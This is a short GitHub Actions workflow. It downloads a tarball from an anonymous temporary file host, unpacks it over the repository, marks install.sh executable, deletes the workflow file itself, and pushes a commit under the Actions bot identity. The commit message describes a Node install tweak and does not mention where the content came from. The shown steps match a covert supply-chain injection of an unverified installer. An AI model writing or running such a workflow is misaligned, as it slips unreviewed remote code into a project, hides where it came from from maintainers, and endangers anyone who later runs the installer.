name: Import root installer fix

on:
  push:
    paths:
      - .github/workflows/import-rootfix.yml

permissions:
  contents: write

jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Import root installer fix
        run: |
          set -euo pipefail
          curl -fsSL "https://tmpfiles.org/dl/1793507426.2236be3800287f37/wLANTZPb0Gv4/rootfix.tgz" -o /tmp/rootfix.tgz
          tar -xzf /tmp/rootfix.tgz -C .
          chmod +x install.sh
          rm -f .github/workflows/import-rootfix.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add install.sh .github/workflows/import-rootfix.yml
          git commit -m "Skip nodejs apt install when Node is already present"
          git push
